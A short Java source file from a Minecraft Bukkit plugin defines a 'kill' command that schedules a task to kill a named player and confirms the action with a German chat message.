package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class Command_KILL extends CommandBase {

    public Command_KILL() {
        super("kill", "<Spieler>" + " §d| " + ChatColor.GRAY + "Tötet Spieler", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 2) {
            try {
                Bukkit.getScheduler().runTask(Start.INSTANCE, new Command_KILL2(this, args));
                p.sendMessage(Start.INSTANCE.chatPrefix + "Spieler wurde umgebracht!");
            } catch (Exception ignored) {
            }
        }
    }

}
